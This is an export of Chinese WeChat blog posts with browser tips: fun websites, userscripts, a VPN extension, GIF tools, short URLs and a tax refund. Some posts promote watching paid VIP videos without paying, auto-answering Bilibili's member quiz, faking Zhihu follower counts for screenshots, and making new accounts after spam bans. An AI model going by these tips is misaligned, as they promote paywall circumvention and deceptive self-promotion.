    <url>%2F2020%2F05%2F09%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第126 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些好玩的网站 ，这是第2篇。 假装 Windows 升级模拟各种系统升级的画面，上班摸鱼的时候boss快过来了赶紧升级下 http://fakeupdate.net/经典的win7更新，按 F11 开始全屏 http://fakeupdate.net/win7/ 帮你谷歌/百度遇见伸手党怎么办？直接教他谷歌/百度 https://lmbtfy.cn/ ，http://lmgtfy.com/ ，https://moedog.org/google/ ， http://iwo.im/，http://buhuibaidu.me/输入关键词后生成一个链接发给他 https://moedog.org/google/?谷歌 ，打开链接跳转谷歌搜索 谷歌 全历史这是一个时光机历史地图 + 文学艺术编年史 + 典籍名著中英对照 + 全球博物馆在线阅览！https://www.allhistory.com/比较有意思的是 AB 路径 功能，可以把任意两个人物或事物联系起来 ，比如输入拿破仑和岳飞，通过4个人就能联系起来，并给你生成一张关系图谱。输入画家的名字还可以纵览他们的作品合集https://www.allhistory.com/painting 计算知识引擎这是一个计算知识引擎,不像百度/谷歌那样的搜索引擎，它能根据问题直接给出答案，比如求数字 13532385396179 的质因数分解 https://www.wolframalpha.com/input/?i=13532385396179结果13532385396179=13×53^2×3853×96179 跟百度结果一样如果想知道 13532385396179 怎么用英语读看看这个 https://spellnumbers.com/ 密码泄露检测之前介绍过火狐的临时存储文件服务https://send.firefox.com/ ,这个也是火狐出品 https://monitor.firefox.com/输入邮箱，检测到我的某个邮箱2017年就泄露了。。。 听猫打呼噜在线 听猫打呼噜 ，可以自己设置参数 https://m.niucodata.com/cat/cat.php 模拟汉字书写笔画顺序根据汉字书写时按照笔画顺序的特征，播放正确笔画顺序的描边动画和练习测试，支持简体字和繁体字，适合学生练字用 https://hanziwriter.org/cn/ 可以在线输入测试 https://hanziwriter.org/cn/demo.html 中午吃什么是不每天在纠结中午吃什么？来这里选一个吧，可以创建自己的菜单随机。 https://www.zwcsm.com/ 在线画图一个类似Windows自带画图板的在线画图工具 https://jspaint.app https://www.autodraw.com/ 这个根据你画的样子会提示你可能想画的东西。 比如一件衣服 左侧可以下载你画的 类似的绘图工具有 http://asciiflow.com/ 和 http://www.draw.io/ 一个模仿微软白板界面的在线白板 https://github.com/daidr/douBoardhttps://ink.daidr.me/ https://awwapp.com/ https://www.autodraw.com/ 查询域名历史 以 hao123 http://www.hosterstats.com/historicaldns.php?domain=hao123.com 为例，通过查询可知 2004 年 8 月卖给百度，2013 年 8 月进行了一次升级，这些信息在 百度百科上可以得到验证。 富强民主编码一个符合中国社会主义核心价值观的编码神器，作用你懂的。https://zhanyuzhang.github.io/harmonious-encoder/将苏生不惑公众号 几个字转为文明爱国再解码回来。 人脸生成使用 StyleGAN，不是换脸，是生成“各种明星脸之间的混合” http://154.8.171.175:8098/再生成几张，颜值挺高的。 类似的还有 https://generated.photos/faces#，https://make.girls.moe/#/ ，https://thispersondoesnotexist.com/ ，https://www.thiswaifudoesnotexist.net/ 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何更优雅地看电影/刷剧]]></title>
    <url>%2F2020%2F05%2F09%2F%E5%A6%82%E4%BD%95%E6%9B%B4%E4%BC%98%E9%9B%85%E5%9C%B0%E7%9C%8B%E7%94%B5%E5%BD%B1-%E5%88%B7%E5%89%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第127 篇原创文章，将本公众号设为星标，第一时间看最新文章。 先说个专辑的事，前天花了点时间建了几个专辑，在收录的文章开头会有个来自专辑。点进去后会看到这个专辑下的所有文章，有兴趣可以看看。 五一长假这几天看了几部电影，我不喜欢用APP看，都直接在电脑端看，这里就分享下如何优雅地看电影或者刷剧。 画中画Chrome 浏览器在 70版本中加入了画中画功能的支持，并且默认开启，打开 chrome://flags/#enable-picture-in-picture 也可以看到。我现在用的最新版本81，如果你是之前的版本可以安装这个扩展 https://chrome.google.com/webstore/detail/picture-in-picture-extens/hkgfoiooedgoejojocmhlaklaeopbecg 打开b站（其实任何一个影视网站都可以），底部有个开启画中画。开启后播放界面已经脱离了浏览器 。可以拖动到任意位置。 如果经常刷b站可以安装一个扩展 哔哩哔哩助手 https://bilibili-helper.github.io/ ，安装Chrome扩展可以参考之前的文章上不了谷歌如何安装 Chrome 扩展？ 它会帮你自动签到。有up主的直播通知。 点击扩展按钮可以看到你关注的up主直播，其他功能之前的文章有介绍过 那些你可能不知道的 bilibili 奇技淫巧 优酷也支持画中画 https://v.youku.com/v_show/id_XNDY1Njg2NjA0NA==.html 广告终结者b站虽然没有广告，但影视剧资源还是比不上优酷，腾讯，爱奇艺，所以看电影还得去这3大网站，但有个比较难受的是开头广告 ，45秒这还算短的，我见过120秒的广告 。想去广告买会员吧，我也不经常上这几个网站，会员就没必要买了。 怎么办？安装个广告终结者Chrome扩展，这是一款参考各种广告过滤插件开发的功能全面的免费开源广告过滤工具。让你不用再忍受网页上烦人的广告，不需要开通VIP，做任务，它集成了广告过滤的所有功能https://www.adtchrome.com/ 支持绝大多数浏览器 安装好扩展后再次打开爱奇艺可以看到广告一晃而过就开始播放视频，我录制了个GIF。 再来对比下去广告前后的搜索比较。 看VIP视频有些影视剧需要VIP观看的，没有会员怎么办？安装个油猴脚本https://greasyfork.org/zh-CN/scripts/370634 ，播放页面左侧有个VIP按钮。 点击后会跳转到新的播放页面，如果有卡顿切换线路。 视频去Logo播放界面有视频网站的logo，如果你截图或者录屏比较介意这个，那推荐这个油猴脚本https://greasyfork.org/zh-CN/scripts/391168 ，关于油猴的使用之前写过好几篇了 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定，2020 年 3 月最新加速下载百度网盘文件方法，相信你应该会用了。 在脚本编辑里可以看到代码，其实就是将视频logo的class隐藏了，如果不想安装油猴脚本直接在控制台执行也是可以的。12345setTimeout(function ()&#123; document.querySelectorAll(".iqp-logo-top").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;); document.querySelectorAll(".txp_waterMark_pic").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;); document.querySelectorAll(".spv-logo").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);&#125;, 3000); 安装脚本前：安装脚本后：由于这个脚本很久没更新了，优酷的logo class名改为了 logo-new手动修改下代码后保存，或者直接控制台执行document.querySelectorAll(&quot;.logo-new&quot;)[0].style.display=&#39;none&#39;; 下载视频如果看到不错的电影想下载到本地，可以看之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？，这里就不多介绍了。 倍速播放视频网站都有倍速播放功能的。 但百度网盘上的电影没有，推荐下 Video Speed Controller 这个扩展 https://chrome.google.com/webstore/detail/video-speed-controller/nffaoalbilbmmfgbnbgppjihopabppdk ，当然它不限制于百度网盘，任何网页视频都可以倍速播放。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何更优雅地使用bilibili(b站)]]></title>
    <url>%2F2020%2F05%2F09%2F%E5%A6%82%E4%BD%95%E6%9B%B4%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8bilibili-b%E7%AB%99%2F</url>
    <content type="text"><![CDATA[苏生不惑第125 篇原创文章，将本公众号设为星标，第一时间看最新文章。 b站是我每天都要逛的网站了，之前也写过了 那些我关注的 b 站 up 主 bilibili(b站)升级到BV号了，还想用av号怎么办？ 那些你可能不知道的 bilibili 奇技淫巧 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 这里再分享个强大的哔哩哔哩增强脚本https://greasyfork.org/zh-CN/scripts/373563-bilibili-evolved 在介绍之前先说下b站的答题，注册b站成为正式会员是需要答题转正的https://www.bilibili.com/v/newbie/basic-1?score=0 ，这个还是很费时间的，我当时就答了好几次没过，分享个自动答题工具，打开控制台将代码（公众号内回复 b站 获取）复制进去，回车运行，自动帮你答。 答题通过 哔哩哔哩增强脚本 强大的哔哩哔哩增强脚本: 下载视频, 音乐, 封面, 弹幕 / 简化直播间, 评论区, 首页 / 自定义顶栏, 删除广告, 夜间模式 / 触屏设备支持 这是个油猴脚本，关于油猴之前写过文章介绍Chrome 浏览器扩展神器油猴 ，安装油猴（公众号内回复 油猴 获取）可以参考之前的文章上不了谷歌如何安装 Chrome 扩展？ 安装油猴扩展后打开脚本地址 https://greasyfork.org/zh-CN/scripts/373563-bilibili-evolved ，直接安装就好。再次打开b站，页面左侧多出了个工具栏，av和BV号都直接显示出来了。选择顶栏布局，点击右侧的眼睛图标可以显示/隐藏它们。选择隐藏的元素，刷新后页面上方都空白了。 还可以在设置里设置视频，样式，动态，直播，工具等。设置太多了，我就不一一演示，设置成自己喜欢的即可。 动态里可以设置过滤不想看的内容。 播放页面可以查看封面，下载字幕，弹幕等。下载视频也方便。下载速度4MB/s，很快了。如果不用脚本也可以使用工具来下载。 这个脚本功能太强大了，更多功能自己摸索吧。 这个油猴脚本我怎么发现的呢？这就需要暴力猴扩展了，关于暴力猴之前写过文章介绍Chrome 浏览器扩展神器暴力猴 暴力猴这也是个Chrome扩展 https://chrome.google.com/webstore/detail/violentmonkey/jinjaccalgkegednnccohejagnlnfdag?hl=zh-CN ，一款非常强大浏览器脚本的管理工具，安装后打开b站点击扩展里的 为此站点查找脚本。 之后跳转到https://greasyfork.org/zh-CN/scripts/by-site/bilibili.com ，这里列出很多适合b站的脚本（其他网站同理），哔哩哔哩增强脚本就在这里。 还有解除B站区域限制脚本 https://greasyfork.org/zh-CN/scripts/25718 通过替换获取视频地址接口的方式, 实现解除B站区域限制; 只对HTML5播放器生效 安装这个脚本后某些限制港澳台的剧也可以看了。 最后再分享个网站 哔哩哔哩UP主每月榜目录 https://leptc.github.io/bili/ ， 比之前介绍的 UP主粉丝量排行榜 更详细 https://www.kanbilibili.com/rank/ups/fans比如查看 2020年3月底有66464名粉丝数&gt;=5000的UP主，老番茄目前破千万了。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 关于 苏生不惑 公众号 不想下载那么多音乐软件？全网音乐在线听和下载 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020年5月如何轻松地使用谷歌搜索，油管（YouTube）]]></title>
    <url>%2F2020%2F05%2F09%2F2020%E5%B9%B45%E6%9C%88%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%EF%BC%8C%E6%B2%B9%E7%AE%A1%EF%BC%88YouTube%EF%BC%89%2F</url>
    <content type="text"><![CDATA[之前分享过几个百度以外的搜索引擎那些除百度以外你可能不知道的小众搜索引擎，但如果可以的话我只推荐谷歌搜索，那如何能上谷歌呢？这里分享下如何免费上谷歌，油管（YouTube）等网站。 谷歌浏览器安装谷歌浏览器国内可以直接访问，https://www.google.cn/intl/zh-CN/chrome/ ，这里直接下载就好。这个之前有写过 那些在国内还能使用的谷歌产品 想上谷歌，油管其实非常简单，安装一个veepn扩展即可。 首先下载扩展到本地，是个crx文件，然后打开Chrome扩展程序 chrome://extensions/开启开发者模式之后直接将这个crx文件拖入扩展程序窗口，可以看到扩展安装好了 如果提示该扩展程序未列在 Chrome 网上应用店中，并可能是在您不知情的情况下添加的或者程序包无效。 先把文件后缀名.crx 改成 .rar或者.zip，然后解压到一个文件夹，再打开扩展程序chrome://extensions/ ，点击加载已解压的扩展程序。 选择刚才解压出的文件夹，确认新增扩展程序就安装好了。 扩展默认是关闭的点击开启如果开启失败可以换个地区。然后打开youtube ps:安装这个扩展后每次打开谷歌浏览器会提示，不用管这个。推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好用的 GIF 录制工具]]></title>
    <url>%2F2020%2F05%2F09%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84-GIF-%E5%BD%95%E5%88%B6%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[苏生不惑第129 篇原创文章，将本公众号设为星标，第一时间看最新文章。 最近我整理了几个专辑（就是文章开头那个来自专辑），可点击下面链接进入，欢迎收藏。 玩转微信系列 实用工具系列 百度网盘系列 黑科技系列 Chrome扩展神器系列 这些网站有意思系列 生活系列 关于GIF之前写过如何将视频轻松转换为 GIF ，不断有小伙伴问有没有好用的GIF录制工具（公众号内回复 gif 获取），这里就分享下。 oCam这个我第一个用过的，不用安装直接运行，单文件11MB。先设置下保存路径。 默认是录制成视频的，需要改为GIF 。录制效果： licecap轻量级、使用简单，还是开源的 https://www.github.com/justinfrankel/licecap ，支持Windows和mac，单文件只有400K ，不用安装直接运行。录制完停止即可。 ScreenToGif这个开源免费https://github.com/NickeManarin/ScreenToGif ，无需安装，可直接运行使用，支持60fps录制，自带编辑器，有 3 种录制方式：屏幕，摄像头和白板。 gifcam这个比较轻巧，只有800多K，不用安装直接运行。 录制里可以自己设置，默认也行，录制完后直接点保存。 bandicam这是一款简单好用，功能强大的屏幕录像软件，录屏幕，录游戏，录视频，也不用安装直接运行 。 GIF制作相信你肯定在网络上经常看到这个为所欲为GIF表情包。 这个GIF来自2010港剧《读心神探》第17集，有兴趣可以去b站看https://www.bilibili.com/video/av16166431 ，如果你想定制里面的文字可以用 https://app.xuty.tk/static/app/index.html#show/6 编辑后点击生成直接点击下载 。 不过这个默认生成的GIF有点大（3-4M），可以用 https://ezgif.com/resize 来压缩下，体积能缩小66%。想把GIF倒着放也是可以的， 推荐 http://www.gif5.net/倒放效果：想看更多有意思的倒放GIF可以关注微博博主 GIF倒放bothttps://weibo.com/tokiwatsuki 还有哪些更好用的GIF工具，欢迎在文章下留言。 推荐历史文章: 如何更优雅地看电影/刷剧 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我是如何一夜之间做到知乎粉丝数破百万的？]]></title>
    <url>%2F2020%2F05%2F09%2F%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%B8%80%E5%A4%9C%E4%B9%8B%E9%97%B4%E5%81%9A%E5%88%B0%E7%9F%A5%E4%B9%8E%E7%B2%89%E4%B8%9D%E6%95%B0%E7%A0%B4%E7%99%BE%E4%B8%87%E7%9A%84%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[看到这个标题别惊讶，先看我录制的GIF，刷新知乎主页粉丝数是166万。 这个效果怎么做的呢？先来说说修改网页元素。 控制台修改网页元素打开知乎主页，右键检查看到粉丝数在 NumberBoard-itemValue 这个class内 ，修改成666可以看到粉丝数变了。 如果想随意修改其他页面元素可以在控制台执行document.designMode = &quot;on&quot; 右侧可以看到有光标了 ，然后随意改了。 当然这个效果在网页刷新后就没了，如果想刷新后也生效的话就需要油猴脚本来实现了。 油猴扩展如果你的浏览器没有安装油猴扩展那真是浪费了，有了油猴你会发现原来浏览器还有这么多功能，比如去广告，看VIP视频，下载视频等，安装油猴扩展见我之前的文章Chrome 浏览器扩展神器油猴 和 上不了谷歌如何安装 Chrome 扩展？ 安装后在扩展程序 chrome://extensions/ 可以看到百度网盘的加速下载也是通过油猴脚本来实现的，见之前的文章2020 年 3 月最新加速下载百度网盘文件方法。 新建油猴脚本安装完油猴扩展后点击油猴扩展图标，添加新脚本 复制下面代码到编辑框内（这个1666666可以随意改）。1234567(function() &#123; 'use strict';setTimeout(function()&#123; document.querySelectorAll('.NumberBoard-itemValue')[1].innerText=1666666 &#125; ,100) // Your code here...&#125;)(); 按 ctrl+s保存 再次打开知乎主页可以看到zhihu fans油猴脚本已加载，再次刷新粉丝数变成1666666。其他网站也一样的，比如b站粉丝数也可以这样来操作。 有兴趣自己也玩下，有什么问题在文章下留言吧。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何下载公众号文章里的视频？]]></title>
    <url>%2F2020%2F05%2F09%2F%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BD%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E9%87%8C%E7%9A%84%E8%A7%86%E9%A2%91%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[本文来自公众号 苏生不惑，不断分享黑科技的公众号。 有时候看到公众号里的视频很不错，想下载到电脑上，怎么操作呢？很简单，下面是教程。 复制文章链接在微信里点击右上角 。。。复制链接，发给自己微信。 控制台搜索播放地址电脑上打开刚才复制的链接，比如这篇https://mp.weixin.qq.com/s/cMUFXDgoGyqOtq9HnudmGA 然后按F12打开控制台（我用的谷歌浏览器，安装谷歌浏览器见之前的文章那些在国内还能使用的谷歌产品 ），在network里搜索mp4可以找到一串很长的地址。 复制出来用软件下载到本地。 idm下载如果嫌上面有点麻烦，建议使用idm软件（公众号内回复 idm），它可以直接在视频上方点击下载。弹出下载框。很快下载完了。用QQ影音播放下。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 如何更优雅地使用 bilibili(b站) 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的简书和知乎被封了]]></title>
    <url>%2F2020%2F05%2F09%2F%E6%88%91%E7%9A%84%E7%AE%80%E4%B9%A6%E5%92%8C%E7%9F%A5%E4%B9%8E%E8%A2%AB%E5%B0%81%E4%BA%86%2F</url>
    <content type="text"><![CDATA[3月25日我的知乎被永久禁言了，打开违规记录 https://www.zhihu.com/community/reported 看到 https://zhuanlan.zhihu.com/p/115737787 这篇文章被举报现在的状态是这样的 打开首页 显示 由于严重违反 知乎社区管理规定 ，该帐号已被永久禁言主页 https://www.zhihu.com/people/sushengbuhuo 最后一条更新永远停留在上个月了。 从2013年到现在6万多收藏获得 41,820 次赞同 等级到了 lv4，阅读总数到360多万，粉丝3080，现在每天还在涨。。。还有人给我私信，可惜永远回复不了了。 随后给管理员私信然而给的回复是你的帐号多次发布站外导流内容，属于规范中界定的垃圾广告信息，因此在内容被删除后帐号被永久禁言，不予恢复。 至今还不断有内容被举报删除 专栏 https://zhuanlan.zhihu.com/c_1178095345963270144 还有356人关注，可惜永远更新不了了。 随后4月23日我的简书也被封了，编辑的时候提示无法操作随后给官方发邮件他们的回复是 经核实，您这个号属于广告营销，按照简书规定，广告营销号要在简书发布，需和简书合作方可~然后我的简书主页https://www.jianshu.com/u/6640b25deaa4 提示 404 这个比知乎更牛的是所有文章他人无法查看了，只能自己看 当前文章已转为仅自己可见，如有疑问查看「消息 - 其他提醒」 从去年5月到现在发布了100多篇文章全部废了。。。谷歌搜到也访问不了了。 冻结期间帐号无法发表和编辑任何内容，您的数据将会为您保留60天，在此期间您可以备份您的文章 随后备份了所有文章 太难了，我就这样怕了吗？不会，再接再厉，从哪跌倒，从哪爬起来，继续注册新账号为公众号引流，不过这次有了教训了。 定个目标，年底苏生不惑公众号粉丝突破2万，加油。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网址太长了难看？生成个短网址吧]]></title>
    <url>%2F2020%2F04%2F24%2F%E7%BD%91%E5%9D%80%E5%A4%AA%E9%95%BF%E4%BA%86%E9%9A%BE%E7%9C%8B%EF%BC%9F%E7%94%9F%E6%88%90%E4%B8%AA%E7%9F%AD%E7%BD%91%E5%9D%80%E5%90%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第124 篇原创文章，将本公众号设为星标，第一时间看最新文章。 所谓短网址就是通过一定的算法把很长的网址得到一个很短的网址，点击这个短网址后会跳转到之前的长网址。 为什么需要短网址呢？比如之前发微博限制140字符，如果链接太长，很容易超出，所以有了短网址t.cn/xxxxxx ，也方便在互联网传播。 这里要吐槽下公众号文章的地址，比如关于 苏生不惑 公众号 这篇文章的链接在微信里复制的链接是 https://mp.weixin.qq.com/s/nX0KtON_0ORGFAxw0m3g3g 然而如果你直接用浏览器打开，链接是这样的http://mp.weixin.qq.com/s?__biz=MzIyMjg2ODExMA==&amp;mid=2247484536&amp;idx=1&amp;sn=34201d2fef25a6078aa01f4004c476c4&amp;chksm=e827a399df502a8fe24c3692d76514b18f377b2b23a38651a0f9338a96c8f3c12ff73813f3b6&amp;token=1901712269&amp;lang=zh_CN#rd 如果你在公众号后台打开的链接变成了超长的https://mp.weixin.qq.com/s?__biz=MzIyMjg2ODExMA==&amp;mid=2247484536&amp;idx=1&amp;sn=34201d2fef25a6078aa01f4004c476c4&amp;chksm=e827a399df502a8fe24c3692d76514b18f377b2b23a38651a0f9338a96c8f3c12ff73813f3b6&amp;scene=126&amp;sessionid=1587559329&amp;key=c934fce6a68262edbe9a8042a5da77e0a581d666b62d7dec2ed42aae194fc2e7a21e1c758f02dd647d5f7ba022b1f7df6cabea21616c4e9552ab492f3abad28e0d47f751881ad9137ac42538a61604f3&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=AeDVe53aJi3OEelV9mNRwRw%3D&amp;pass_ticket=GbTzbBlJFyFwyHqtJrjNowPsPGr3Mrb2IZ0v%2F1VcU1%2Fhe%2BTUi%2FDSxPWDmltFGKSD ，发在微信群里一大坨，发在朋友圈被折叠，真不知道微信为什么这样设计。 短网址除了简短方便传播，还有就是用于数据统计，有多少人点击了，点击了几次，使用的什么手机或者浏览器，访问地区等等，比如知乎的链接都加了个跳转 https://link.zhihu.com/?target=http%3A//dwz.cn/同时也方便拦截某些网址，跟微信里一样。 国外有比较知名的 bit.ly 和tinyurl 短网址服务，国内也有新浪的t.cn和百度的dwz.cn，下面就分享几个好用的生成短网址工具，给公众号文章链接生成一个短网址。 微博你看到的t.cn开头的链接都是微博的，生成t.cn短网址很简单，打开微博首页发一条带网址的微博，231个长字符的链接生成后的短网址为 http://t.cn/A6wmXlzY，长度只有20。 有人会说这么短，会不会用完？答案是不会，t.cn后的8位数是大小写字母和数字组成的，有62个，62的8次方是218340105584896，足够用了。 如果t.cn偶尔打不开，可以使用原来的域名 sinaurl.cn，或者通过ip查询 http://ip.tool.chinaz.com/sinaurl.cn，然后绑定host为 60.180.187.102 t.cn 百度百度的短网址工具地址 https://dwz.cn/console/operation ，生成的短网址 https://dwz.cn/WvmDcHxL 。 第三方短网址工具木函工具箱是一个免费的第三方生成短网址工具 https://web.woobx.cn/app/short-link 支持 t.cn，dwz.cn，url.cn 等域名，比如上面那篇文章生成的微博短网址 http://t.cn/A6wmJTO7 http://www.sina.lt/ 这个不支持t.cn ，生成的短网址 http://dwz.date/apPJ 这里再推荐一个有意思的 https://zws.im/​‌​​​‌​​‌‌​​‌​，这个在之前的文章[如何发一条空白的朋友圈](https://mp.weixin.qq.com/s/Xz1m-mqtCcBF_4hmGCpkUQ) 有写过。 这个网站用不可见字符欺骗你的视觉（跟发空白朋友圈原理一样，公众号内回复 朋友圈 发一条试试吧）。 给上面的公众号文章生成的短网址还是https://zws.im/​‌​​​‌​​‌‌​​‌​ ，看起来跟网站一模一样。 不过这个生成服务在国外，有点慢，有人开发了国内版 https://ml.mk/ ，生成的短网址还是 https://ml.mk/‌‍‌‍‍‍‌‍‍‍‍‌‌‍‌‌‌‍/。 当然我还是推荐使用Chrome扩展 urlShorter(缩短网址/二维码) https://chrome.google.com/webstore/detail/url-shortener-with-qr-cod/imocofkcogboajnibnnjeehpmhfgpecl ，关于安装Chrome扩展参考之前的文章上不了谷歌如何安装 Chrome 扩展？安装扩展后点击扩展图标，选择要生成的短网址域名即可，还有对应的二维码。 提醒最后是个提醒，由于生成的短网址看不出来原来的域名，在打开之前你不知道它会跳转到哪个网站，所以要小心被钓鱼，尤其在手机上不方便看网址，你打开的可能不是真正的网站。 还有在办公室打开别人发来的某个短网址跳转到某些不可描述的网站，让同事看到就很尴尬了，而且有些网站打开就播放声音，别问我怎么知道的。。。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 手把手教你申报2019个人所得税（已退税1800） 那些好玩的生成器网站 关于 苏生不惑 公众号 不想下载那么多音乐软件？全网音乐在线听和下载 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手教你申报个人所得税（已退税1800）]]></title>
    <url>%2F2020%2F04%2F24%2F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E7%94%B3%E6%8A%A5%E4%B8%AA%E4%BA%BA%E6%89%80%E5%BE%97%E7%A8%8E%EF%BC%88%E5%B7%B2%E9%80%80%E7%A8%8E1800%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第123 篇原创文章，将本公众号设为星标，第一时间看最新文章。 其实个人所得税申报3月份就开始了（截止时间6月30日），我一直没弄，正好趁周末搞了下，花了1个小时左右，成功退税1800，这里就分享下，先说明下操作流程： 下载个人所得税APP（网页版也可以）。 选择专项附加扣除申报（子女教育、继续教育、大病医疗、住房贷款利息、住房租金和赡养老人）。 综合所得年度汇算。 系统会自动显示你的收入情况、纳税情况及退税金额。 选择绑定的银行卡申报退税。 注册个人所得税账号注册分为大厅注册码注册和人脸识别认证注册https://etax.chinatax.gov.cn/yhzc.html 大厅注册需要携带本人身份证件去本地的办税大厅申请系统注册码，完成注册实名认证。有点麻烦直接走人脸识别认证注册，不过这个要下载“个人所得税”APP下载后登录网页版 https://etax.chinatax.gov.cn/ ，直接扫码登录（也可以用密码登录），为什么不用APP呢，使用没有网页方便，而且还禁止截图。 ps:记得注册后绑定一个银行卡。 专项扣除填报先来说下应纳税所得额=综合所得额（工资+劳务80%+稿酬80%70%+特许80%）-免征（6万以内）-扣除（专项：三险一金（公司扣了），附加（子女教育（1.2万/年/人），继续教育（考证成功） ，医疗（自付大于1.5万，最高8万），首次房贷（1.2万），房租（大城市1.8万，二线城市1.2万，小城市9600），房贷和房租二选一 ，赡养老人（60岁以上）。 简单点就是 应纳税所得额 = 综合所得额– 免征额– 扣除额，更详细可以看看李永乐老师的视频 https://www.weibo.com/3325704142/IDT676Uvl 注意只有年收入超过12万，且补税金额超过400才需要补税。 我暂时没有子女教育，继续教育，医疗和赡养老人（60岁以上），房贷和房租二选一，我选择了住房租金。 选择租房 https://etax.chinatax.gov.cn/declare/transferPage.html ，注意这里时间段要选2019.1.1-2020.1.1 （合同编号可以不填）接着选择自行申报确认下 综合所得年度汇算接下来选择综合所得年度汇算（标准申报）https://etax.chinatax.gov.cn/declare/ndhsqj/doing.html ，选择使用已申报数据填写。下面可以看到我所在公司新浪的收入纳税数据。 开始申报这里会显示你的基础信息下一步进入到收入和税前扣除点击右侧的详情可以看到我每个月交的保险，公积金什么的。最后算出一个应纳税所得额。下一步进入税款计算，应退税额1800这个数是根据所得额所在区间算的。 提交就行了，下面开始申请退税。 申请退税选择之前绑定的银行卡退税申请成功。在申报查询（更正/作废申报） https://etax.chinatax.gov.cn/declare/list.html?type=ysb 可以看到退税进度。 如果最后算出你是需要补税的（大于400），可不能假装不知道，国家给你的可以不要，你欠的可别想着不给（会征收税务滞纳金和影响征信），大数据都存着呢，偷税漏税可耻，依法纳税光荣，但有便宜不占就是智商问题了，快去看看你能退多少吧。 最后感谢国家给的退税，来个抽奖吧，公众号后台回复 抽奖 抽5个16元现金红包，抽中后直接免费提现到微信（有微信通知），类似之前的2020 新年福利，直接现金红包抽奖。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 那些好玩的生成器网站 关于 苏生不惑 公众号 不想下载那么多音乐软件？全网音乐在线听和下载 